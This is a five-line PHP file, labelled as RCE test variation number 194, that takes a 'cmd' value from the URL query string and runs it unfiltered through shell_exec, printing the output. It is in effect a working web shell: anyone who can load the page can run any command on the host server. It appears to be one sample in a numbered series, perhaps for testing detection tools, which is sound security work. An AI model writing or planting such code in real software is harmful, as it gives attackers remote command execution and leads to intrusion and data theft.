<?php
// RCE test variation #194
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>